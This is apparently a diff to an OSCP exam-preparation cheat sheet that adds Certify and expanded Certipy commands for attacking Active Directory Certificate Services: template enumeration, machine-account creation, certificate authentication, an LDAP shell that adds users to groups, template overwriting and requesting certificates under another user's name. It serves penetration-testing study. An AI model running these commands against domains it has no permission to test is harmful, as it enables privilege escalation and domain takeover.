@@ -112,11 +112,13 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 		- [MSL / Polyglot Attack](https://github.com/0xsyr0/OSCP#msl--polyglot-attack)
 		- [Metasploit](https://github.com/0xsyr0/OSCP#metasploit)
 	- [Post Exploitation](https://github.com/0xsyr0/OSCP#post-exploitation-1)
+		- [Active Directory Certificate Services (ADCS)](https://github.com/0xsyr0/OSCP#active-directory-certificate-services-adcs)
 		- [AppLocker Bypass List](https://github.com/0xsyr0/OSCP#applocker-bypass-list)
 		- [autologon](https://github.com/0xsyr0/OSCP#autologon)
 		- [Bash Privilege Escalation](https://github.com/0xsyr0/OSCP#bash-privilege-escalation)
 		- [Basic Linux Enumeration](https://github.com/0xsyr0/OSCP#basic-linux-enumeration)
 		- [Basic Windows Enumeration](https://github.com/0xsyr0/OSCP#basic-windows-enumeration)
+		- [Certify](https://github.com/0xsyr0/OSCP#certify)
 		- [Certipy](https://github.com/0xsyr0/OSCP#certipy)
 		- [Credential Files](https://github.com/0xsyr0/OSCP#credential-files)
 		- [Evil-WinRM](https://github.com/0xsyr0/OSCP#evil-winrm)
@@ -284,6 +286,7 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 | PPLdump | https://github.com/itm4n/PPLdump |
 | nanodump | https://github.com/helpsystems/nanodump |
 | LAPSDumper | https://github.com/n00py/LAPSDumper |
+| Certify | https://github.com/GhostPack/Certify |
 | Certipy | https://github.com/ly4k/Certipy |
 | Whisker | https://github.com/eladshamir/Whisker |
 | PyWhisker | https://github.com/ShutdownRepo/pywhisker |
@@ -2556,18 +2559,73 @@ wmic qfe get Caption,Description,HotFixID,InstalledOn
 driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
 ```
 
+#### Certify
+
+> https://github.com/GhostPack/Certify
+
+```c
+PS: C:\> Certify find
+```
+
 #### Certipy
 
 > https://github.com/ly4k/Certipy
 
 > https://github.com/ly4k/BloodHound/
 
+##### Common Commands
+
 ```c
-certipy find -dc-ip <RHOST> -u <USERNAME>@<DOMAIN> -p <PASSWORD>
+$ certipy find -dc-ip <RHOST> -u <USERNAME>@<DOMAIN> -p <PASSWORD>
+```
+
+##### Certificate Handling
+
+###### Account Creation
+
+```c
+$ certipy account create -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -dns <DOMAIN_CONTROLLER_DNS_NAME> -user <COMPUTERNAME>
+```
+
+###### Authentication
+
+```c
+$ certipy auth -pfx <FILE>.pfx -dc-ip <RHOST> -u <USERNAME> -domain <DOMAIN>
+```
+
+###### LDAP-Shell
+
+```c
+$ certipy auth -pfx <FILE>.pfx -dc-ip <RHOST> -u <USERNAME> -domain <DOMAIN> -ldap-shell
 ```
 
 ```c
-./BloodHound --disable-gpu-sandbox
+# add_user <USERNAME>
+# add_user_to_group <GROUP>
+```
+
+###### Certificate Forging
+
+```c
+$ certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template Web -dc-ip <RHOST> -save-old
+```
+
+###### Certificate Request
+
+Run the following command twice because of a current issue with `certipy`.
+
+```c
+$ certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST>
+```
+
+```c
+$ certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST> -upn <USERNAME>@<DOMAIN> -dns <FQDN>
+```
+
+##### Start BloodHound Fork
+
+```c
+$ ./BloodHound --disable-gpu-sandbox
 ```
 
 #### Credential Files
